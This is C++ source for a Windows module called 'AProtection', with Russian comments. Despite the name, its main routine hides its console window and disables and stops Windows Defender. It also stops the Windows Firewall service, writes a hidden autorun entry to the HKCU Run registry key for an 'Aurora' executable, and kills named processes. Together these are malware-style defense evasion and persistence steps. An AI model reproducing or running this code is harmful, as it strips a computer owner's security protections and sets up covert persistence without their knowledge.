#include "AProtection.h"
#include <Windows.h>
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <string>
#include <vector>

void auto_hide_start() {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS)
    {
        std::wstring appName = L"Aurora";
        std::wstring appPath = L"D:\\Aurora\\jar_some.exe";
        std::wstring command = appPath + L" /HIDDEN";

        // Проверяем наличие значения в реестре
        DWORD dataSize = 0;
        result = RegQueryValueExW(hKey, appName.c_str(), nullptr, nullptr, nullptr, &dataSize);

        if (result == ERROR_FILE_NOT_FOUND)
        {
            // Значение отсутствует, выполняем регистрацию
            result = RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(command.c_str()), static_cast<DWORD>(sizeof(wchar_t) * (command.size() + 1)));

            if (result == ERROR_SUCCESS)
            {
                std::wcout << L"Registry key value set successfully.\n";
            }
            else
            {
                std::wcout << L"Failed to set registry key value. Error code: " << result << L"\n";
            }
        }
        else if (result == ERROR_SUCCESS)
        {
            // Значение уже присутствует, пропускаем регистрацию
            std::wcout << L"Registry key value already exists. Skipping registration.\n";
        }
        else
        {
            std::wcout << L"Failed to query registry key value. Error code: " << result << L"\n";
        }

        result = RegCloseKey(hKey);
        if (result == ERROR_SUCCESS)
        {
            std::wcout << L"Registry key closed successfully.\n";
        }
        else
        {
            std::wcout << L"Failed to close registry key. Error code: " << result << L"\n";
        }
    }
    else
    {
        std::wcout << L"Failed to open registry key. Error code: " << result << L"\n";
    }
}

void TerminateProcessesByProcessName(const std::vector<std::wstring>& processNameList)
{
    DWORD processIds[1024];
    DWORD cbNeeded;

    if (!EnumProcesses(processIds, sizeof(processIds), &cbNeeded))
    {
        return;
    }

    DWORD numProcesses = cbNeeded / sizeof(DWORD);

    for (DWORD i = 0; i < numProcesses; i++)
    {
        DWORD processId = processIds[i];

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processId);

        if (hProcess != NULL)
        {
            TCHAR szProcessName[MAX_PATH];
            DWORD dwSize = MAX_PATH;
            if (!QueryFullProcessImageName(hProcess, 0, szProcessName, &dwSize))
            {
                continue;
            }

            // Извлекаем только название процесса без пути
            std::wstring fullPath = szProcessName;
            std::wstring processName = fullPath.substr(fullPath.find_last_of(L"\\") + 1);

            for (const auto& targetName : processNameList)
            {
                if (processName == targetName)
                {
                    std::wcout << L"Процесс \"" << processName << L"\" найден. Попытка завершить процесс..." << std::endl;
                    if (TerminateProcess(hProcess, 0))
                    {
                        std::wcout << L"Процесс \"" << processName << L"\" успешно завершен." << std::endl;
                    }
                }
            }

            CloseHandle(hProcess);
        }
    }
}

void DisableDefender()
{
    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scmHandle == nullptr)
    {
        std::cout << "Failed to open SCManager." << std::endl;
        return;
    }

    SC_HANDLE serviceHandle = nullptr;

    // Получение имени службы защитника Windows
    constexpr LPCWSTR defenderServiceName = L"WinDefend";

    serviceHandle = OpenService(scmHandle, defenderServiceName, SERVICE_CHANGE_CONFIG);
    if (serviceHandle == nullptr)
    {
        std::cout << "Failed to open Windows Defender service." << std::endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    SERVICE_STATUS serviceStatus = {};
    if (!QueryServiceStatus(serviceHandle, &serviceStatus))
    {
        std::cout << "Failed to query service status." << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
        return;
    }

    if (serviceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        if (!ChangeServiceConfig(serviceHandle, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr))
        {
            std::cout << "Failed to disable Windows Defender." << std::endl;
            CloseServiceHandle(serviceHandle);
            CloseServiceHandle(scmHandle);
            return;
        }

        if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus))
        {
            std::cout << "Failed to stop Windows Defender service." << std::endl;
            CloseServiceHandle(serviceHandle);
            CloseServiceHandle(scmHandle);
            return;
        }

        // Ожидание завершения остановки службы
        while (serviceStatus.dwCurrentState != SERVICE_STOPPED)
        {
            if (!QueryServiceStatus(serviceHandle, &serviceStatus))
            {
                std::cout << "Failed to query service status." << std::endl;
                break;
            }

            Sleep(1000); // Пауза 1 секунда
        }
    }

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

    std::cout << "Windows Defender disabled." << std::endl;
}

void DisableFirewall() {
    // Имя сервиса брандмауэра Windows
    const wchar_t* firewallServiceName = L"MpsSvc";

    // Получение дескриптора сервисного контроллера
    SC_HANDLE scmHandle = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scmHandle == nullptr)
    {
        std::cout << "Failed to open SCManager." << std::endl;
 
    }

    // Получение дескриптора сервиса брандмауэра Windows
    SC_HANDLE serviceHandle = OpenService(scmHandle, firewallServiceName, SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);
    if (serviceHandle == nullptr)
    {
        std::cout << "Failed to open Windows Firewall service." << std::endl;
        CloseServiceHandle(scmHandle);
      
    }

    // Получение текущего состояния сервиса брандмауэра
    SERVICE_STATUS serviceStatus;
    if (!QueryServiceStatus(serviceHandle, &serviceStatus))
    {
        std::cout << "Failed to query Windows Firewall service status." << std::endl;
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);
       
    }

    // Проверка текущего состояния сервиса
    if (serviceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        // Выключение сервиса брандмауэра
        if (ControlService(serviceHandle, SERVICE_CONTROL_STOP, &serviceStatus))
        {
            std::cout << "Windows Firewall is now turned off." << std::endl;
        }
        else
        {
            std::cout << "Failed to turn off Windows Firewall." << std::endl;
        }
    }
    else if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
    {
        std::cout << "Windows Firewall is already turned off." << std::endl;
    }
    else
    {
        std::cout << "Windows Firewall is in an unexpected state." << std::endl;
    }

    // Закрытие дескрипторов
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void Aur_Hide::protection_main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    DisableDefender();
    DisableFirewall();
    auto_hide_start();
    std::vector<std::wstring> processNameList = { L"1.exe", L"1.exe" }; // Список названий процессов для завершения
    TerminateProcessesByProcessName(processNameList);
}